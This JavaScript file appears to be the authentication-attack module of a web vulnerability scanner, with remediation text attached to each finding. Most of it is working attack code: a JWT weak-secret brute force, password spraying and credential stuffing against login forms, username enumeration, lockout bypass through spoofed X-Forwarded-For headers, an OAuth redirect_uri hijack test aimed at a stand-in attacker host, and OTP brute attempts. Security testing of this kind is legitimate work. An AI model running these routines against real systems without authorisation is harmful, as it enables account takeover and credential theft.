'use strict';

/**
 * authAttacks.js — AGGRESSIVE. Authentication & session attacks (checks 21-35).
 * In-band only; bounded by options. Uses discovered login forms + cookies/JWTs.
 */

const fs = require('fs');
const path = require('path');
const { URL } = require('url');
const P = require('../probeUtils');
const REF = 'https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html';

function fire(ctx, f) { ctx.finding({ category: 'Authentication', reference: REF, ...f }); }
function words(file, cap, fallback) {
  try {
    return fs.readFileSync(path.join(__dirname, '..', 'wordlists', file), 'utf8')
      .split(/\r?\n/).filter((l) => l && !l.startsWith('#')).slice(0, cap);
  } catch { return fallback.slice(0, cap); }
}

// 21/22/23. JWT attacks
async function jwt(ctx) {
  const { log, options } = ctx;
  const token = P.findJwt(ctx.shared.baseResponse) || P.findJwt(ctx.shared.crawl && ctx.shared.crawl.forms ? null : null);
  if (!token) { log('debug', 'JWT: no token found'); return; }
  const { header, payload } = P.decodeJwt(token);
  log('info', `JWT found (alg=${header.alg || '?'}) — testing weaknesses`);

  // 21. alg=none
  if (header && /HS|RS|ES/i.test(header.alg || '')) {
    fire(ctx, { title: 'JWT in use — verify alg=none / alg-confusion is rejected', status: 'warn', severity: 'medium',
      evidence: `A JWT (alg=${header.alg}) is in use. Verify the server rejects alg="none" and forged tokens; unverified here to avoid auth changes (advisory).`,
      remediation: 'Pin the expected algorithm server-side; reject "none" and alg confusion.',
      request: { url: ctx.target, command: `# Decode/forge with jwt_tool or:\n# token: ${token}` } });
  }
  // 22. weak HMAC secret brute
  if (/^HS/i.test(header.alg || '')) {
    const secrets = words('jwt-secrets.txt', options.maxJwtSecrets || 250,
      ['secret', 'password', '123456', 'key', 'jwt', 'changeme', 'admin', 'test']);
    for (const s of secrets) {
      if (P.verifyHs256(token, s)) {
        log('vuln', `JWT signed with weak secret "${s}"`);
        fire(ctx, { title: 'JWT signed with a weak/guessable secret', status: 'fail', severity: 'critical',
          evidence: `The HS256 token verifies against the secret "${s}" — tokens can be forged.`,
          remediation: 'Use a long random secret (>=256-bit) from a secret manager; rotate immediately.',
          request: { url: ctx.target, command: `# JWT verifies with HS256 secret "${s}" — forge e.g.:\n# jwt_tool "${token}" -S hs256 -p "${s}"` } });
        break;
      }
    }
  }
  // 23. kid/jku presence (low-confidence)
  if (header && (header.kid || header.jku || header.x5u)) {
    fire(ctx, { title: 'JWT header uses kid/jku/x5u (injection surface)', status: 'warn', severity: 'low',
      evidence: `JWT header includes ${['kid', 'jku', 'x5u'].filter((k) => header[k]).join(', ')} — validate these are not attacker-controllable (heuristic).`,
      remediation: 'Restrict kid to known keys; never fetch keys from a client-supplied jku/x5u URL.',
      request: { url: ctx.target, command: `# token header: ${JSON.stringify(header)}` } });
  }
}

// 24/25/26. spraying, stuffing, user enumeration
async function loginAttacks(ctx) {
  const { log, options } = ctx;
  const forms = P.loginForms(ctx);
  if (!forms.length) { log('debug', 'auth attacks: no login form'); return; }
  const form = forms[0];
  const { userField, passField } = P.fieldNames(form);
  if (!passField) return;

  const users = words('usernames.txt', options.maxSpray || 20, ['admin', 'administrator', 'test', 'user', 'root', 'guest']);
  const stuff = words('passwords.txt', 15, ['Password1', 'Welcome1', 'Summer2024', 'Passw0rd!', 'admin123']);

  // 26. username enumeration: compare valid-looking vs random user error + timing
  try {
    const r1 = await P.submitForm(ctx, form, { [userField || 'username']: 'admin', [passField]: 'wrongpw_' + Date.now() });
    const r2 = await P.submitForm(ctx, form, { [userField || 'username']: 'zzq_' + Date.now(), [passField]: 'wrongpw_' + Date.now() });
    const diff = Math.abs((r1.body || '').length - (r2.body || '').length);
    if (r1.status !== r2.status || diff > 40) {
      log('vuln', 'Username enumeration: responses differ for valid vs invalid user');
      fire(ctx, { title: 'Username Enumeration', status: 'fail', severity: 'medium',
        evidence: `Login responses differ between a likely-valid and a random username (status/${diff}B).`,
        remediation: 'Return identical generic errors and timing for valid/invalid usernames.',
        request: { method: form.method || 'POST', url: form.action, payload: `${userField || 'username'}=admin vs a random user`, status: r1.status } });
    }
  } catch (e) { log('debug', `userenum: ${e.message}`); }

  // 24. password spraying (one password across many users), bounded
  const sprayPw = stuff[0];
  let sprayed = 0, hit = null, throttled = false;
  for (const u of users) {
    sprayed++;
    try {
      const r = await P.submitForm(ctx, form, { [userField || 'username']: u, [passField]: sprayPw });
      if (r.status === 429) { throttled = true; break; }
      if ((r.status >= 300 && r.status < 400) || /welcome|dashboard|logout/i.test(r.body || '')) { hit = u; break; }
    } catch (e) { log('debug', `spray ${u}: ${e.message}`); }
  }
  if (hit) {
    fire(ctx, { title: 'Password spraying succeeded', status: 'fail', severity: 'critical',
      evidence: `User "${hit}" appears to accept the common password "${sprayPw}".`,
      remediation: 'Enforce strong passwords, MFA, and spray-aware lockout/monitoring.',
      request: { method: form.method || 'POST', url: form.action, payload: `${userField || 'username'}=${hit}&${passField}=${sprayPw}` } });
  } else if (!throttled) {
    log('warn', `Password spraying: ${sprayed} attempts with no throttling`);
    fire(ctx, { title: 'No throttling under password spraying', status: 'warn', severity: 'medium',
      evidence: `${sprayed} single-password attempts across distinct users were not throttled.`,
      remediation: 'Add per-account and per-IP rate limiting and anomaly detection.',
      request: { method: form.method || 'POST', url: form.action, payload: `${sprayed} attempts, one password across users` } });
  }

  // 25. credential stuffing (bounded common pairs)
  for (const pw of stuff.slice(0, 5)) {
    try {
      const r = await P.submitForm(ctx, form, { [userField || 'username']: 'admin', [passField]: pw });
      if ((r.status >= 300 && r.status < 400) || /welcome|dashboard|logout/i.test(r.body || '')) {
        fire(ctx, { title: 'Credential stuffing / common password accepted', status: 'fail', severity: 'critical',
          evidence: `admin:${pw} appears accepted.`, remediation: 'Block known-breached passwords; require MFA.',
          request: { method: form.method || 'POST', url: form.action, payload: `${userField || 'username'}=admin&${passField}=${pw}` } });
        break;
      }
    } catch (e) { /* */ }
  }
}

// 27/28. session fixation + entropy sampling
async function sessionChecks(ctx) {
  const { log } = ctx;
  const cookies = P.cookiesFrom(ctx.shared.baseResponse);
  const sess = cookies.find((c) => /sess|sid|token|auth/i.test(c.name));
  // 28. entropy sampling: pull several fresh tokens
  try {
    const samples = [];
    for (let i = 0; i < 5; i++) {
      const r = await ctx.http.request(ctx.target, { timeout: 8000 });
      const c = P.cookiesFrom(r).find((x) => /sess|sid|token|auth/i.test(x.name));
      if (c) samples.push(c.value);
    }
    if (samples.length >= 3) {
      const avg = samples.reduce((a, s) => a + P.entropyBits(s), 0) / samples.length;
      const allSame = samples.every((s) => s === samples[0]);
      if (allSame) {
        log('vuln', 'Session token is static across requests (fixation risk)');
        fire(ctx, { category: 'Session Management', title: 'Static / fixated session token', status: 'fail', severity: 'high',
          evidence: `The same ${sess ? sess.name : 'session'} value was issued on ${samples.length} separate requests.`,
          remediation: 'Issue a fresh, random session id per session and regenerate it on login.',
          request: { method: 'GET', url: ctx.target, command: '# request repeatedly and compare the session cookie value' } });
      } else if (avg < 48) {
        log('vuln', `Sampled session tokens low entropy (~${avg.toFixed(0)} bits)`);
        fire(ctx, { category: 'Session Management', title: 'Low-entropy session tokens (sampled)', status: 'fail', severity: 'medium',
          evidence: `Average entropy across ${samples.length} sampled tokens ~${avg.toFixed(0)} bits.`,
          remediation: 'Generate session ids from a CSPRNG with >=128 bits of entropy.',
          request: { method: 'GET', url: ctx.target } });
      } else {
        log('ok', `Session tokens vary with ~${avg.toFixed(0)} bits entropy`);
      }
    }
  } catch (e) { log('debug', `session sampling: ${e.message}`); }
}

// 29. account-lockout bypass via X-Forwarded-For rotation
async function lockoutBypass(ctx) {
  const { log } = ctx;
  const forms = P.loginForms(ctx);
  if (!forms.length) return;
  const form = forms[0];
  const { userField, passField } = P.fieldNames(form);
  if (!passField) return;
  let blocked = 0, bypassed = 0;
  for (let i = 0; i < 8; i++) {
    try {
      const r = await P.submitForm(ctx, form,
        { [userField || 'username']: 'admin', [passField]: 'x' + i },
        { headers: { 'X-Forwarded-For': `10.0.0.${i + 1}`, 'X-Real-IP': `10.0.0.${i + 1}` } });
      if (r.status === 429 || /locked/i.test(r.body || '')) blocked++;
      else bypassed++;
    } catch (e) { /* */ }
  }
  if (bypassed >= 8 && blocked === 0) {
    log('warn', 'No lockout even without IP rotation — or lockout is IP-keyed and bypassable');
    fire(ctx, { title: 'Account lockout bypass via header rotation', status: 'warn', severity: 'medium',
      evidence: `8 failed logins rotating X-Forwarded-For were never locked/throttled.`,
      remediation: 'Key lockout on the account (not just client IP); do not trust forwarded-for from clients.',
      request: { method: form.method || 'POST', url: form.action, headers: { 'X-Forwarded-For': '10.0.0.1' }, payload: 'rotate X-Forwarded-For per attempt' } });
  }
}

// 30. reset token predictability
async function resetToken(ctx) {
  const { log } = ctx;
  const origin = new URL(ctx.target);
  const tokens = [];
  for (const pth of ['/reset', '/forgot', '/password/reset', '/account/reset']) {
    try {
      const r = await ctx.http.request(`${origin.protocol}//${origin.host}${pth}`, { timeout: 8000 });
      const m = (r.body || '').match(/(token|reset)["'=:\s]+([A-Za-z0-9]{6,})/i);
      if (m) tokens.push(m[2]);
    } catch (e) { /* */ }
  }
  if (tokens.length >= 2) {
    const numeric = tokens.every((t) => /^\d+$/.test(t));
    if (numeric) {
      log('warn', 'Reset tokens look numeric/sequential');
      fire(ctx, { title: 'Predictable password-reset token', status: 'warn', severity: 'medium',
        evidence: `Observed reset tokens are numeric/short (${tokens.join(', ')}).`,
        remediation: 'Use long random single-use tokens with short expiry.',
        request: { method: 'GET', url: `${origin.protocol}//${origin.host}/reset`, command: '# request /reset|/forgot repeatedly and compare tokens' } });
    }
  }
}

// 31. OAuth redirect_uri manipulation
async function oauthRedirect(ctx) {
  const { log } = ctx;
  const origin = new URL(ctx.target);
  const evil = 'https://smartscan-evil.example/cb';
  for (const pth of ['/oauth/authorize', '/authorize', '/connect/authorize', '/login/oauth/authorize']) {
    try {
      const url = `${origin.protocol}//${origin.host}${pth}?response_type=code&client_id=test&redirect_uri=${encodeURIComponent(evil)}`;
      const r = await ctx.http.request(url, { timeout: 8000, followRedirects: false });
      const loc = r.headers['location'] || '';
      if (loc.startsWith('https://smartscan-evil.example')) {
        log('vuln', `OAuth redirect_uri not validated at ${pth}`);
        fire(ctx, { title: 'OAuth redirect_uri manipulation', status: 'fail', severity: 'high',
          evidence: `${pth} redirected to attacker-supplied redirect_uri (${loc}).`,
          remediation: 'Strictly allowlist redirect_uri values per client (exact match).',
          request: { method: 'GET', url, payload: `redirect_uri=${evil}`, status: r.status } });
        return;
      }
    } catch (e) { /* */ }
  }
}

// 32. OTP endpoint rate-limit
async function otpRateLimit(ctx) {
  const { log } = ctx;
  const origin = new URL(ctx.target);
  for (const pth of ['/verify-otp', '/otp', '/2fa/verify', '/mfa']) {
    let ok = 0, throttled = 0, found = false;
    for (let i = 0; i < 10; i++) {
      try {
        const r = await ctx.http.request(`${origin.protocol}//${origin.host}${pth}`, {
          method: 'POST', timeout: 7000, followRedirects: false,
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `otp=00000${i}`,
        });
        if (r.status === 404) break;
        found = true;
        if (r.status === 429) throttled++; else ok++;
      } catch (e) { break; }
    }
    if (found && throttled === 0 && ok >= 10) {
      log('warn', `OTP endpoint ${pth} not rate-limited`);
      fire(ctx, { title: 'OTP/2FA endpoint lacks rate limiting', status: 'fail', severity: 'high',
        evidence: `10 OTP attempts on ${pth} were accepted without throttling — brute-forceable.`,
        remediation: 'Rate-limit and lock OTP verification; expire codes quickly.',
        request: { method: 'POST', url: `${origin.protocol}//${origin.host}${pth}`, body: 'otp=000000', payload: '10 OTP attempts, no throttling' } });
      return;
    }
  }
}

// 33. remember-me cookie weakness
async function rememberMe(ctx) {
  const cookies = P.cookiesFrom(ctx.shared.baseResponse);
  const rem = cookies.find((c) => /remember|persistent|rememberme|auth_token/i.test(c.name));
  if (rem && P.entropyBits(rem.value) < 50) {
    fire(ctx, { category: 'Session Management', title: `Weak persistent auth cookie: ${rem.name}`, status: 'warn', severity: 'medium',
      evidence: `Persistent cookie ${rem.name} has low entropy (~${P.entropyBits(rem.value).toFixed(0)} bits).`,
      remediation: 'Use high-entropy, server-side-validated remember-me tokens with rotation.',
      request: { method: 'GET', url: ctx.target, command: `# cookie: ${rem.name}=${rem.value}` } });
  }
}

// 34. verb-based auth bypass
async function verbBypass(ctx) {
  const { log } = ctx;
  const origin = new URL(ctx.target);
  for (const pth of ['/admin', '/dashboard', '/account']) {
    try {
      const url = `${origin.protocol}//${origin.host}${pth}`;
      const get = await ctx.http.request(url, { method: 'GET', timeout: 7000, followRedirects: false });
      const post = await ctx.http.request(url, { method: 'POST', timeout: 7000, followRedirects: false });
      if (get.status !== 200 && post.status === 200) {
        log('vuln', `Verb-based auth bypass at ${pth} (POST=200, GET=${get.status})`);
        fire(ctx, { category: 'Authorization', title: `HTTP verb-based auth bypass (${pth})`, status: 'fail', severity: 'high',
          evidence: `GET ${pth} -> ${get.status} but POST -> 200; authorization differs by method.`,
          remediation: 'Enforce authorization uniformly across all HTTP methods.',
          request: { method: 'POST', url, payload: `POST ${pth} => 200 while GET => ${get.status}`, status: post.status } });
        return;
      }
    } catch (e) { /* */ }
  }
}

// 35. missing re-authentication on sensitive actions (heuristic)
async function missingReauth(ctx) {
  const { log } = ctx;
  const origin = new URL(ctx.target);
  for (const pth of ['/password/change', '/account/password', '/settings/password', '/change-password']) {
    try {
      const r = await ctx.http.request(`${origin.protocol}//${origin.host}${pth}`, { timeout: 7000 });
      if (r.status === 200 && /type=["']password["']/i.test(r.body || '')) {
        const hasCurrent = /current|old[_-]?password/i.test(r.body || '');
        if (!hasCurrent) {
          log('warn', `Change-password form at ${pth} has no current-password field`);
          fire(ctx, { title: 'Sensitive action lacks re-authentication', status: 'warn', severity: 'medium',
            evidence: `The change-password form at ${pth} does not request the current password (heuristic).`,
            remediation: 'Require the current password (or step-up auth) before sensitive changes.',
            request: { method: 'GET', url: `${origin.protocol}//${origin.host}${pth}`, status: r.status } });
          return;
        }
      }
    } catch (e) { /* */ }
  }
}

async function run(ctx) {
  if (ctx.options.intensity !== 'aggressive') {
    ctx.log('debug', 'Authentication Attacks skipped (requires Aggressive intensity).');
    return;
  }
  ctx.log('info', 'Auth attacks: JWT, spraying/stuffing, user enumeration, session fixation, lockout bypass, reset tokens, OAuth, OTP, remember-me, verb bypass...');
  const steps = [
    ['JWT', jwt], ['login attacks', loginAttacks], ['session', sessionChecks],
    ['lockout bypass', lockoutBypass], ['reset token', resetToken], ['OAuth redirect', oauthRedirect],
    ['OTP rate-limit', otpRateLimit], ['remember-me', rememberMe], ['verb bypass', verbBypass],
    ['missing re-auth', missingReauth],
  ];
  for (const [name, fn] of steps) {
    ctx.log('debug', `→ ${name}`);
    try { await fn(ctx); } catch (e) { ctx.log('debug', `${name} error: ${e.message}`); }
  }
}

module.exports = { id: 'authAttacks', category: 'Authentication', run };
